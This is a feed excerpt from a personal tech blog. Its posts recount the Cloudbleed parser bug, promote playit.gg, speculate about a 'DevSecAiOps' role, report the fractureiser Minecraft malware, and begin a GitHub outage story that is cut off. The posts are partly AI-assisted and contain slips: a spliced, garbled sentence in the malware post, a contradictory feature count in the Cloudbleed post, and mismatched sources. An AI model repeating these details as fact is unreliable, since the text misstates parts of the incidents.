        <media:content url="https://blog.thefourcraft.com/media/posts/49/How-One-Line-of-Code-Almost-Blew-Up-the-Internet.png" medium="image" />
            <category term="Zero Trust"/>
            <category term="Vulnerability"/>
            <category term="Security"/>
            <category term="Network"/>
            <category term="Google"/>
            <category term="Documentary"/>
            <category term="Cloudflare"/>

        <updated>2023-06-16T10:13:21+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/49/How-One-Line-of-Code-Almost-Blew-Up-the-Internet.png" alt="" />
                    <p>The digital realm is intricately woven into the fabric of our modern society, and at its core lies an intricate network of codes. Each line of this code bears the potential to either sustain the digital world as we know it or disrupt it entirely. Let's delve into a fascinating incident that nearly shook the internet's foundation – a tale of how a single line of code in <a class="ql-mention" href="https://www.linkedin.com/post/edit/7075015664599457792/#" data-entity-urn="urn:li:fsd_company:407222" data-guid="2" data-object-urn="urn:li:organization:407222" data-original-text="Cloudflare" spellcheck="false">Cloudflare</a>'s system almost led to a catastrophic leakage of private information. This incident is a stark reminder of the fragility of the digital infrastructure we often take for granted and the critical importance of rigorous testing and code review processes. Buckle up for a deep dive into the incident that almost blew up the internet on February 24, 2017.</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/49/How-One-Line-of-Code-Almost-Blew-Up-the-Internet.png" class="type:primaryImage" alt="" /></p>
                <p>The digital realm is intricately woven into the fabric of our modern society, and at its core lies an intricate network of codes. Each line of this code bears the potential to either sustain the digital world as we know it or disrupt it entirely. Let's delve into a fascinating incident that nearly shook the internet's foundation – a tale of how a single line of code in <a class="ql-mention" href="https://www.linkedin.com/post/edit/7075015664599457792/#" data-entity-urn="urn:li:fsd_company:407222" data-guid="2" data-object-urn="urn:li:organization:407222" data-original-text="Cloudflare" spellcheck="false">Cloudflare</a>'s system almost led to a catastrophic leakage of private information. This incident is a stark reminder of the fragility of the digital infrastructure we often take for granted and the critical importance of rigorous testing and code review processes. Buckle up for a deep dive into the incident that almost blew up the internet on February 24, 2017.</p>

<h2>The Bug That Shook The Internet</h2>
<p>On February 24, 2017, the internet faced a potential catastrophe. An incident involving <a class="ql-mention" href="https://www.linkedin.com/post/edit/7075015664599457792/#" data-entity-urn="urn:li:fsd_company:407222" data-guid="3" data-object-urn="urn:li:organization:407222" data-original-text="Cloudflare" spellcheck="false">Cloudflare</a>, a company that provides performance and security services to millions of websites, threatened to spill private data across the web. The issue was a memory leak caused by a <a class="ql-mention" href="https://www.linkedin.com/post/edit/7075015664599457792/#" data-entity-urn="urn:li:fsd_company:407222" data-guid="5" data-object-urn="urn:li:organization:407222" data-original-text="Cloudflare" spellcheck="false">Cloudflare</a>'s HTML parser bug. Tavis Ormandy first reported the bug from Google’s Project Zero, who noticed corrupted web pages returned by some HTTP requests run through Cloudflare.</p>
<p><a class="ql-mention" href="https://www.linkedin.com/post/edit/7075015664599457792/#" data-entity-urn="urn:li:fsd_company:407222" data-guid="4" data-object-urn="urn:li:organization:407222" data-original-text="Cloudflare" spellcheck="false">Cloudflare</a>'s edge servers, under certain unusual circumstances, were returning memory containing private data like HTTP cookies, authentication tokens, and HTTP POST bodies. Some of this data had even been cached by search engines, increasing the potential damage. While this sounds alarming, it's worth noting that Cloudflare customer SSL private keys were not leaked due to the isolation of SSL connections through an instance of NGINX unaffected by this bug.</p>
<h2>Taking Immediate Action</h2>
<p>The seriousness of the bug led to the immediate formation of a cross-functional team from software engineering, infosec, and operations in San Francisco and London. The team worked round the clock, with 12-hour shifts, to ensure a 24-hour work cycle. They aimed to understand the cause and the extent of the memory leakage and coordinate with <a class="ql-mention" href="https://www.linkedin.com/post/edit/7075015664599457792/#" data-entity-urn="urn:li:fsd_company:1441" data-guid="13" data-object-urn="urn:li:organization:1441" data-original-text="Google" spellcheck="false">Google</a> and other search engines to remove any cached HTTP responses. Thanks to their dedication, what could have taken three months to resolve under industry standards was fully dealt with globally in under 7 hours, with initial mitigation happening in just 47 minutes.</p>
<p>The most significant impact period was between February 13 and February 18, with around 1 in every 3,300,000 HTTP requests through Cloudflare potentially resulting in memory leakage. This translates to about 0.00003% of requests, but with the sheer volume of traffic Cloudflare handles, the implications were significant.</p>
<h2>Unraveling The Root Cause</h2>
<p>The root of the problem lay in Cloudflare's parsing system. Cloudflare uses a parser to modify HTML pages as they pass through their edge servers. It offers various services like inserting the Google Analytics tag, rewriting http:// links to https://, and more. This parser was written using Ragel, a state machine compiler, which had become too complex to maintain over the years. Consequently, Cloudflare began transitioning to a new parser named cf-html, which was faster and easier to maintain.</p>
<p>The memory leak bug had been in the Ragel-based parser for years but was only triggered when the new parser cf-html was introduced. This caused changes in the buffering system, enabling the memory leak. As soon as the correlation with cf-html was identified, Cloudflare disabled three features that used it - email obfuscation, Server-side Excludes, and Automatic HTTPS Rewrites, effectively stopping almost all memory leaks within a few seconds. A third feature, Server-Side Excludes, was also vulnerable and quickly patched within three hours.</p>
<h2>The Infamous One Line of Code</h2>
<p>The root cause of the bug was a pointer error in the generated C code from Ragel. <br>The end of a buffer was checked using the equality operator, allowing the pointer to step past the end of the buffer, resulting in a buffer overrun. Had the check been done using the '&gt;=' operator instead of '==', the buffer overrun would have been caught.</p>
<p>The Ragel code contained a bug that caused the pointer to jump over the end of the buffer and past the ability of an equality check to spot the buffer overrun. This error was triggered particularly when parsing broken HTML tags at the end of a web page. An example of such a tag is <code>&lt;script type=</code>. In such cases, the buffer would be overrun. Statistically, such broken tags occur on about 0.06% of websites.</p>
<h2>Incident Timeline</h2>
<ul>
<li>
<p>At an unspecified date, Cloudflare decided that their Ragel-based parser had become too complex to maintain, so they started to write a new parser, named cf-html, to replace it. This parser was used to modify HTML pages on the fly as they passed through Cloudflare's edge servers, for functions such as obfuscating email addresses, enabling AMP, inserting Google Analytics tags, and more.</p>
</li>
<li>
<p>A bug existed in Cloudflare's use of the Ragel-based parser that would result in a memory leak. However, this bug was not exposed until the introduction of cf-html, which subtly changed the buffering and enabled the leakage. The bug was not in the Ragel parser or cf-html itself, but in the way Cloudflare used Ragel.</p>
</li>
<li>
<p>On February 13, Cloudflare changed the Email Obfuscation feature, which was one of the features that activated cf-html. This became the primary cause of the memory leak.</p>
</li>
<li>
<p>Between February 13 and February 18, approximately 1 in every 3,300,000 HTTP requests through Cloudflare potentially resulted in memory leakage, which is about 0.00003% of requests.</p>
</li>
<li>
<p>On an unspecified Friday, Tavis Ormandy from Google’s Project Zero contacted Cloudflare to report a security problem with Cloudflare's edge servers. He was observing corrupted web pages being returned by some HTTP requests run through Cloudflare. The edge servers were running past the end of a buffer and returning memory that contained private information such as HTTP cookies, authentication tokens, HTTP POST bodies, and other sensitive data.</p>
</li>
<li>
<p>Cloudflare responded by forming a cross-functional team from software engineering, infosec, and operations in San Francisco and London. They worked to fully understand the underlying cause, understand the effect of the memory leakage, and to work with Google and other search engines to remove any cached HTTP responses.</p>
</li>
<li>
<p>47 minutes after receiving details of the problem, Cloudflare activated the global kill for the Email Obfuscation feature, stopping almost all memory leaks. 3 hours and 5 minutes later, they activated the global kill for the Automatic HTTPS Rewrites feature. They confirmed that they were not seeing memory leakage via test URIs and had Google double check that they saw the same thing.</p>
</li>
<li>
<p>Cloudflare discovered that a third feature, Server-Side Excludes, was also vulnerable. Since it was an older feature, it did not have a global kill switch. They implemented a global kill for Server-Side Excludes and deployed a patch to their fleet worldwide, which took roughly three hours.</p>
</li>
<li>
<p>The root cause of the bug was a pointer error. The Ragel code that Cloudflare wrote contained a bug that caused the pointer to jump over the end of the buffer and past the ability of an equality check to spot the buffer overrun. This error was found to occur when the webpage ended with a broken HTML tag. From their statistics, they found that such broken tags at the end of the HTML occur on about 0.06% of websites.</p>
</li>
<li>
<p>Cloudflare stated that they fixed the bug and its consequences globally in under 7 hours with an initial mitigation in 47 minutes. They also emphasized that Cloudflare customer SSL private keys were not leaked and that they have not discovered any evidence of malicious exploits of the bug or other reports of its existence.</p>
</li>
</ul>
<h2>A Close Call and Lessons Learned</h2>
<p>This incident was a close call for the internet. With a significant number of websites relying on Cloudflare's services, the potential leak of private data could have had far-reaching consequences. However, the swift action taken by Cloudflare's team, their transparency about the problem, and the steps taken to mitigate the issue serve as an excellent example of handling security crises.</p>
<p>Moreover, the incident underscores the importance of rigorous testing and code review processes, especially when dealing with critical systems handling sensitive data. Even a seemingly innocuous code change can have unforeseen and widespread effects, reminding us all of the profound responsibility and potential impact of a single line of code.</p>
<h2>Sources</h2>
<ul>
<li>
<p><a href="https://techcrunch.com/2023/03/10/cloudflare-outage/" target="_new">Cloudflare outage takes down a large portion of the internet</a></p>
</li>
<li><a href="https://blog.cloudflare.com/quantifying-the-impact-of-cloudbleed/" target="_blank" rel="noopener noreferrer">Quantifying the Impact of "Cloudbleed"</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1139" target="_blank" rel="noopener noreferrer">Issue 1139: cloudflare: Cloudflare Reverse Proxies are Dumping Uninitialized Memory</a></li>
<li><a href="https://asamborski.github.io/cs558_s17_blog/2017/04/08/cloudbleed.html" target="_blank" rel="noopener noreferrer">Cloudbleed</a></li>
<li><a href="Ragel State Machine Compiler" target="_blank" rel="noopener noreferrer">Ragel State Machine Compiler</a></li>
<li><a href="https://arstechnica.com/information-technology/2017/02/serious-cloudflare-bug-exposed-a-potpourri-of-secret-customer-data/" target="_new">Details about the Cloudflare memory leak incident - Ars Technica</a></li>
<li><a href="https://news.ycombinator.com/item?id=13718752" target="_new">Discussion on the Cloudflare memory leak incident - Hacker News</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1139" target="_new">Initial report by Tavis Ormandy - Project Zero</a></li>
<li><a href="https://github.com/pirate/sites-using-cloudflare" target="_new">Github - Cloudflare's incident report and timeline</a></li>
<li><a href="https://www.theverge.com/2023/3/12/22228956/cloudflare-outage-down-detector-web-performance" target="_new">Cloudflare’s bad software deployment led to a big web slowdown</a></li>
<li><a href="https://blog.cloudflare.com/incident-report-on-memory-leak-caused-by-cloudflare-parser-bug/" target="_new">Incident report on memory leak caused by Cloudflare parser bug</a></li>
<li><a href="https://www.youtube.com/watch?v=GEbn3nHyKnA&amp;t=234s" target="_blank" rel="noopener noreferrer">How One Line of Code Almost Blew Up the Internet</a> - <a class="yt-simple-endpoint style-scope yt-formatted-string" spellcheck="false" href="https://www.youtube.com/@kevinfaang" dir="auto">Kevin Fang</a></li>
</ul>
            ]]>
        </content>
    </entry>
    <entry>
        <title>A Deep Dive into playit.gg</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/a-deep-dive-into-playitgg/index.html"/>
        <id>https://blog.thefourcraft.com/a-deep-dive-into-playitgg/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/48/A-Deep-Dive-into-playit.gg.png" medium="image" />
            <category term="playit.gg"/>
            <category term="Security"/>
            <category term="Product Recommendation"/>
            <category term="My Personal Opinion"/>
            <category term="DDos"/>
            <category term="Cloudflare"/>
            <category term="Cloud Security"/>

        <updated>2023-06-15T10:37:10+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/48/A-Deep-Dive-into-playit.gg.png" alt="" />
                    <p>In the world of online gaming, server infrastructure is a critical component. As players, we often take the technology that makes our online adventures possible for granted. Let's talk about a service revolutionizing how we think about gaming servers: <a href="https://playit.gg/" rel="noopener nofollow" target="_blank">playit.gg</a>.</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/48/A-Deep-Dive-into-playit.gg.png" class="type:primaryImage" alt="" /></p>
                <p>In the world of online gaming, server infrastructure is a critical component. As players, we often take the technology that makes our online adventures possible for granted. Let's talk about a service revolutionizing how we think about gaming servers: <a href="https://playit.gg/" rel="noopener nofollow" target="_blank">playit.gg</a>.</p>

<h2>What is playit.gg?</h2>
<p>playit.gg is a forward-thinking service allowing anyone to create free secure gaming servers. In a world where the cost of maintaining infrastructure can hinder creative endeavors, playit.gg steps up to provide an invaluable resource to the gaming community.</p>
<p>The platform is not just about cost savings, though. It's also about security, reliability, and performance. And this is where our technical deep dive begins: with the magic of an anycast network.</p>
<blockquote>
<div class="info-section margin-top">
<p>playit.gg is a networking service that make it possible to host game servers at home that anyone across the world can join. We do this through our custom tunneling software. You can find our opensource client <a href="https://playit.gg/about" rel="noreferrer">here</a>. When you launch the playit program, the program will connect to our Anycast Network and assign you a static IP and port. You can then share your static IP and port with friends. When they connect, their connection information will go to the nearest tunnel server and be tunneled to the playit program running on your computer. By tunneling the connection, your friend is able to connect to the server running within your network.</p>
<p>From the About page on the website :) </p>
</div>
</blockquote>
<h2>What is an Anycast network?</h2>
<p>Anycast is a network addressing and routing methodology that enables routing inbound requests to different locations, depending on factors like congestion, distance, and link health. In the context of DevOps and network management, anycast offers tremendous advantages.</p>
<p>In a conventional unicast network, a single IP address is tied to a single device. An IP address can be assigned to multiple devices with anycast, typically servers distributed across different geographical locations. When a user requests an anycast IP address, network protocols determine the best path to one of these servers, usually the closest or least congested.</p>
<p>This has several implications for system resilience and performance. Anycast networks can handle heavy traffic loads, automatically routing around congestion and spreading demand across multiple servers. They can also improve latency, as users are routed to the nearest server.</p>
<p>In addition, anycast networks can enhance security. For example, in the event of a Distributed Denial of Service (DDoS) attack, the traffic can be distributed across multiple servers, reducing the risk of any single server being overwhelmed. This is especially important for a gaming service like playit.gg, which needs to maintain uptime and performance even in the face of potential cyberattacks.</p>
<blockquote>
<p>An Anycast Network is a network where all of our IP addresses are available at all of our datacenters. When you or a player tries to communicate with a playit tunnel server, your ISP will route your connection to what they consider is the closet datacenter we operate in. ISPs don't always get this right so we're actively working of a new ways to improve this.</p>
<p>From the About page on the website :) </p>
</blockquote>
<h2>How to use playit.gg?</h2>
<p>Using playit.gg is straightforward. After signing up for an account, you can create your gaming server by following the prompts on the website. You can customize your server to suit your needs, including choosing the game you want to host, the number of players, and other settings.</p>
<p>Once your server is set up, playit.gg provides an IP address you can share with other players. This IP address is hosted on playit.gg's anycast network, ensuring that your server benefits from resilience, performance, and security offered 100% free by playit.gg.</p>
<h2>What do you get in the free tier?</h2>
<p>playit.gg offers both free and premium tiers, with the free tier offering up to 4 TCP ports, 4 UDP ports, and a single firewall. For users on IPv6 networks, playit.gg offers immense flexibility with the ability to use any or all of your 65,000+ public ports on your IP. Additional features like custom domains and dedicated IP addresses are available as add-ons.</p>
<h2>About DDoS Attacks and playit.gg</h2>
<p>In 2023, Distributed Denial of Service (DDoS) attacks have become a significant threat to the online gaming industry, significantly reshaping its landscape. These attacks involve overwhelming a network, service, or server with internet traffic, causing it to slow down or crash. In the gaming context, these attacks target the game servers, disrupting the gaming experience for players and potentially leading to substantial financial losses for gaming companies.</p>
<p>The most direct impact of a DDoS attack on a gaming server is the disruption it causes to the players. Games may become laggy, disconnect frequently, or entirely inaccessible, significantly affecting players' gaming experience. A successful DDoS attack for gaming companies can result in substantial financial losses. These can stem from lost revenue during the attack, the cost of mitigating the attack, and potential compensation to affected players. Frequent or severe DDoS attacks can damage a gaming company’s reputation, losing the player base.</p>
<p>A service like playit.gg is acutely aware of the potential for DDoS attacks and has implemented measures to protect its users and maintain service quality. When you launch the playit program, the program will connect to playit.gg's Anycast Network and assign you a static IP and port. Your static IP and port can then be shared with friends. When they connect, their connection information will go to the nearest tunnel server and be tunneled to the playit program on your computer. By tunneling the connection, your friends can connect to the server running within your network.</p>
<h2>What is the best part about playit.gg</h2>
<p>One of the vital safety benefits of playit.gg is that it hides your IP, meaning that even if there is a DDoS attack, it won't affect your network. The service also lets you turn the "tunneling" off anytime by closing the program. Additionally, playit.gg features strong firewalls and better connection handling, further bolstering the service's resilience to DDoS attacks and other potential disruptions.</p>
<h2>Challenges of DDoS Protection in Playit.gg</h2>
<p>Despite the advantages of playit.gg's DDoS protection, some challenges come with it. One of the primary issues is the cost of maintaining a robust defense against DDoS attacks. In a message from Patrick, the founder and CEO of playit.gg, he acknowledges that the only viable way to handle these attacks is to invest more money in renting powerful servers. This could be a substantial expenditure, especially given the scale and frequency of the attacks.</p>
<h2>About DDoS in gaming</h2>
<p>The gaming industry is increasingly implementing measures to combat DDoS attacks. These include using DDoS protection services, educating players about DDoS attacks, and improving incident response capabilities. These measures aim to ensure the reliability and security of online gaming experiences and to minimize disruption to players​</p>
<h2>On a Personal note</h2>
<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
<div class="flex flex-grow flex-col gap-3">
<div class="min-h-[20px] flex flex-col items-start gap-4 whitespace-pre-wrap break-words">
<div class="markdown prose w-full break-words dark:prose-invert dark">
<p>I deeply enjoy featuring remarkable tools on my blog and introducing them to a global audience. As a financial supporter of the playit.gg project, I cannot stress enough how much I believe in their mission and their service. I highly encourage you to try it out for yourself and perhaps consider becoming a supporter. The gaming community thrives with the support of its passionate members, and every contribution helps ensure the availability of innovative platforms like playit.gg. </p>
<p>Written with 🥙 and ❤️ by me, ChatGPT, Google Bard &amp; perplexity.ai </p>
</div>
</div>
</div>
</div>
</div>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>DevSecAiOps The Future</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/devsecaiops-the-future/index.html"/>
        <id>https://blog.thefourcraft.com/devsecaiops-the-future/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/46/DevSecAiOps-The-Future.png" medium="image" />
            <category term="artificial intelligence"/>
            <category term="The Future"/>
            <category term="Security"/>
            <category term="My Personal Opinion"/>
            <category term="DevOps"/>
            <category term="AI"/>

        <updated>2023-06-11T08:50:00+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/46/DevSecAiOps-The-Future.png" alt="" />
                    <p>Imagine a world where artificial intelligence seamlessly integrates and enhances a tech organization's development, security, and operations. This is the world of DevSecAiOps, a hypothetical future role that could revolutionize how we approach technology.</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/46/DevSecAiOps-The-Future.png" class="type:primaryImage" alt="" /></p>
                <p>Imagine a world where artificial intelligence seamlessly integrates and enhances a tech organization's development, security, and operations. This is the world of DevSecAiOps, a hypothetical future role that could revolutionize how we approach technology.</p>

<h2>Defining DevSecAiOps</h2>
<p>Today, we're familiar with DevSecOps, a methodology that integrates development, security, and operations. Its philosophy promotes closer collaboration between previously siloed lines, resulting in more efficient processes and better end products.</p>
<p>DevSecAiOps, as the name implies, takes this one step further by incorporating AI into the mix. This means harnessing AI to improve, automate, and innovate across all areas of the DevSecOps process.</p>
<h2>The Shift Toward AI</h2>
<p>As AI becomes increasingly prevalent and sophisticated, its potential applications in DevOps are vast. From automating mundane tasks and speeding up development cycles to enhancing security measures and optimizing system operations, AI is a game-changer.</p>
<h3>AI in Development</h3>
<p>AI has the potential to streamline the development process significantly. It can automate coding, testing, debugging, and more. By reducing the human effort required for these tasks, developers can focus more on their work's strategic, creative, and complex aspects.</p>
<h3>AI in Security</h3>
<p>In the security realm, AI can be used to predict and identify threats more effectively. It can analyze patterns, detect anomalies, and respond to incidents faster than humanly possible. With AI, we can proactively mitigate risks and enhance the overall security posture of our systems.</p>
<h3>AI in Operations</h3>
<p>Regarding operations, AI can optimize resource allocation, system performance, and incident response. Predictive analytics can foresee potential issues, while automation can handle routine tasks, freeing human resources for more complex challenges.</p>
<h2>Imagining the DevSecAiOps Role</h2>
<p>The DevSecAiOps role would need a deep understanding of development, security, and operations and a solid grasp of AI. They must know how to apply AI to benefit these areas and align with the organization's goals.</p>
<p>However, this doesn't mean every DevSecAiOps professional must be an AI expert. They would need a foundational understanding and the ability to work with AI specialists. Collaboration and continuous learning would be critical aspects of this role.</p>
<h2>The Future of DevSecAiOps</h2>
<p>As organizations embrace digital transformation, the demand for roles like DevSecAiOps will likely increase. The future of this role hinges on how rapidly AI evolves and how quickly organizations can adapt to these changes.</p>
<p>Given the increasing reliance on AI in various industries, it's not far-fetched to imagine a role like DevSecAiOps emerging soon. This role is at the intersection of technology and innovation, poised to redefine the tech landscape.</p>
<p>In conclusion, while DevSecAiOps doesn't exist today, it's a concept worth exploring. As the tech world evolves, roles like this could become a reality. The fusion of development, security, AI, and operations could be the next step in evolving tech roles, taking us into an exciting, uncharted future.</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>&quot;fractureiser&quot; - Security Vulnerability in the CurseForge and Bukkit Platform</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/fractureiser-security-vulnerability-in-the-curseforge-and-bukkit-platform/index.html"/>
        <id>https://blog.thefourcraft.com/fractureiser-security-vulnerability-in-the-curseforge-and-bukkit-platform/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/47/fractureiser-Security-Vulnerability-in-the-CurseForge-and-Bukkit-Platform.png" medium="image" />
            <category term="Vulnerability"/>
            <category term="Security"/>
            <category term="Minecraft"/>
            <category term="CurseForge"/>
            <category term="Bukkit"/>

        <updated>2023-06-07T14:12:06+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/47/fractureiser-Security-Vulnerability-in-the-CurseForge-and-Bukkit-Platform.png" alt="" />
                    <p>The Minecraft community has recently been hit with shocking news. The widely used CurseForge and Bukkit platforms have reportedly been compromised. Many groups have reported malware uploaded on various projects, potentially through a security vulnerability in the <a href="https://www.overwolf.com/" target="_blank" rel="nofollow noopener noreferrer">Overwolf</a> platform.</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/47/fractureiser-Security-Vulnerability-in-the-CurseForge-and-Bukkit-Platform.png" class="type:primaryImage" alt="" /></p>
                <p>The Minecraft community has recently been hit with shocking news. The widely used CurseForge and Bukkit platforms have reportedly been compromised. Many groups have reported malware uploaded on various projects, potentially through a security vulnerability in the <a href="https://www.overwolf.com/" target="_blank" rel="nofollow noopener noreferrer">Overwolf</a> platform.</p>

<h2>Who is Overwolf?</h2>
<p>Overwolf is a software platform that allows gamers to create and use in-game apps. It was founded in 2010 by Uri Marchand, Gil Or, Alon Ranowitz, and Nir Finkelstein with a cash seed investment from Joseph (Yossi) Vardi.</p>
<p><a href="https://www.perplexity.ai/search/230dd1cd-aa02-48cd-a453-96235392205c" target="_blank" rel="noopener noreferrer">By Perplexity AI</a></p>
<h2>What is CurseForge and Bukkit Platform?</h2>
<h3><strong>CurseForge</strong></h3>
<ul class="list-disc list-outside">
<li>CurseForge is a website that hosts Bukkit plugins, addons, mods, and customization content</li>
<li>Overwolf owns it</li>
<li>CurseForge is a popular platform for Minecraft modding, and it is known for being easy to use</li>
</ul>
<h3><span class=""><strong>Bukkit Platform</strong></span></h3>
<ul class="list-disc list-outside">
<li>Bukkit is a software platform that allows developers to create plugins for Minecraft servers</li>
<li>Bukkit plugins can be used to add new features, modify gameplay, and improve server performance<a target="_blank" rel="noopener noreferrer" class="citation ml-xs inline" href="https://www.curseforge.com/minecraft/bukkit-plugins" style="font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);">
<div class="inline-flex relative -top-[0.3rem] light font-sans text-base text-textOff dark:text-textOffDark selection:bg-super selection:text-white dark:selection:bg-opacity-50 selection:bg-opacity-70" style="display: inline !important;">
<div class="inline-flex h-[1rem] min-w-[1rem] px-[0.2em] rounded-full items-center justify-center text-center font-semibold md:hover:text-white tabular-nums border-borderMain/75 dark:border-borderMainDark divide-borderMain dark:divide-borderMainDark ring-borderMain dark:ring-borderMainDark  transition duration-300 bg-offsetPlus dark:bg-offsetPlusDark md:hover:bg-super" style="display: inline !important;"> </div>
</div>
</a><span class="whitespace-nowrap"><br></span></li>
<li>The Bukkit platform is hosted on CurseForge, which provides a repository for Bukkit plugins<span class="whitespace-nowrap"><br></span></li>
</ul>
<p><a href="https://www.perplexity.ai/search/aebf3a19-2224-439d-b67e-76340cfcc2a0?s=u" target="_blank" rel="noopener noreferrer">By Perplexity AI</a></p>
<h2><strong>Overview of the Security Breach</strong></h2>
<p>The CurseForge and Bukkit platforms, home to a multitude of Minecraft mods and plugins, have fallen victim to a massive cybersecurity breach. A substantial number of modpacks and mods, especially those on 1.16.5, 1.18.2, and 1.19.2 versions, were reportedly updated with malware. The unauthorized access to accounts and uploads of malicious files point towards a potential vulnerability in the Overwolf platform, which manages CurseForge and Bukkit.</p>
<h2><strong>Diving Deeper into the Malware</strong></h2>
<p>The malware was detected in mid-April and has since been injected into numerous popular plugins and mods. The affected accounts reportedly had two-factor authentication enabled, which suggests this isn't a simple password compromise but something potentially bigger on the CurseForge side.</p>
<p>The malware appears to extract Microsoft credentials and browser-saved passwords. We strongly advise all users to RESET ALL OF THEIR PASSWORDS after they have removed the virus.</p>
<h2><strong>Distribution</strong></h2>
<p>Some modpacks have had updates published for them without the authors' knowledge, adding a dependency on malicious mods. The malicious mods have uploaded dates multiple weeks in the past. DUE TO CURSE'S USAGE, a CDN compromise or cache poisoning is not out of the question. numbers, thus giving it a botnet-like behavior. It runs a command to execute a function to download the program again and save it as a self-running file. This malware has infiltrated numerous modpacks, and even with immediate archiving, these files might become accessible again later, exposing hundreds of thousands of players to malware.</p>
<p>The code execution mainly targets Linux users, possibly intending to infiltrate servers, but Windows users are not exempt from this threat. One particular file from this incident was not archived immediately and gained 10 downloads, implying it's possibly being disseminated through other platforms.</p>
<p class="msg msg--warning">As a precautionary measure, it is highly recommended to avoid updating any mods or modpacks until this threat is effectively neutralized.</p>
<h2><strong>Potential Impacts</strong></h2>
<p>The impacts could be extensive with the number of potentially compromised accounts and the malware's capability to extract sensitive information like saved passwords. Users risk losing control of their accounts or sensitive personal and financial data. The broader impact on the Minecraft modding community is also severe, with the potential for widespread mistrust and uncertainty.</p>
<h2>The Iris Project's Statement</h2>
<p>The Iris Project, another prominent player in the Minecraft modding community, has also voiced its concerns about the issue. The project's team states that they believe numerous accounts on CurseForge have been compromised and are being used to upload malicious files containing bot-nets. They have assured their user base that they are actively investigating the situation.</p>
<blockquote>
<p class="p1">"We have reason to believe many accounts on CurseForge have been hacked and are uploading malicious files containing bot-nets. Luna Pixel Studios, the owner of many big modpacks, is one of the affected accounts. The situation is being actively looked into."</p>
</blockquote>
<h2>What Do We Learn</h2>
<p>The CurseForge and Bukkit breach has brought the importance of cybersecurity to the forefront once again. It serves as a reminder of the persistent threats in the digital landscape. As we await the resolution of the issue, it's critical to stay vigilant, ensuring we take steps to protect our data and systems from potential threats.</p>
<p>Stay vigilant, perform regular checks on your system, and keep an eye out for updates on this situation. Remember, your cybersecurity is in your hands!</p>
<h2>References</h2>
<ul>
<li>For the latest news, check out this <a href="https://hackmd.io/B46EYzKXSfWSF35DeCZz9A" target="_new">document</a></li>
<li>Luna Pixel Studios <a href="https://discord.com/channels/780522480867868723/780522480867868726/848382717102342165" target="_new">Announcement</a></li>
<li>The Iris Project's <a href="https://discord.com/channels/703688753276715079/703688753276715082/848382165810339860" target="_new">Statement</a></li>
<li>Download <a href="https://hackmd.io/B46EYzKXSfWSF35DeCZz9A" target="_new">Windows Script</a></li>
<li>Download <a href="https://hackmd.io/B46EYzKXSfWSF35DeCZz9A" target="_new">Linux Script</a></li>
</ul>
<p> </p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>How GitHub&#x27;s Database Self-Destructed in 43 Seconds</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/how-to-try-to-be-a-good-decsecops-engineer/index.html"/>
        <id>https://blog.thefourcraft.com/how-to-try-to-be-a-good-decsecops-engineer/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/45/How-GitHubs-Database-Self-Destructed-in-43-Seconds.png" medium="image" />
            <category term="MySQL"/>
            <category term="GitHub"/>
            <category term="Documentary"/>
            <category term="DevOps"/>
            <category term="Database"/>

        <updated>2023-06-16T14:09:23+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/45/How-GitHubs-Database-Self-Destructed-in-43-Seconds.png" alt="" />
                    <p>On October 21st, 2018, GitHub, the world's leading software development platform, experienced a significant operational mishap. During routine maintenance work on their East Coast network, connectivity to a hub was severed, creating a network partition between the East Coast data center and everything else. This incident led to GitHub losing half of its servers. Although the maintenance crew restored the connection in 43 seconds, GitHub experienced an additional 24 hours of service degradation. Users couldn't log in, stale data was served, and the website was read-only.</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/45/How-GitHubs-Database-Self-Destructed-in-43-Seconds.png" class="type:primaryImage" alt="" /></p>
                <p>On October 21st, 2018, GitHub, the world's leading software development platform, experienced a significant operational mishap. During routine maintenance work on their East Coast network, connectivity to a hub was severed, creating a network partition between the East Coast data center and everything else. This incident led to GitHub losing half of its servers. Although the maintenance crew restored the connection in 43 seconds, GitHub experienced an additional 24 hours of service degradation. Users couldn't log in, stale data was served, and the website was read-only.</p>

<h2>The Architecture of GitHub's Database</h2>
<p>GitHub stores all its metadata, such as issues, pull requests, comments, notifications, and actions, in MySQL. They use a standard primary replica setup where writes go to the primary, replicating one or more read replicas. This setup improves read throughput and availability as reads can be distributed throughout all replicas, and if the primary fails, a fellow replica can be promoted to take its place.</p>
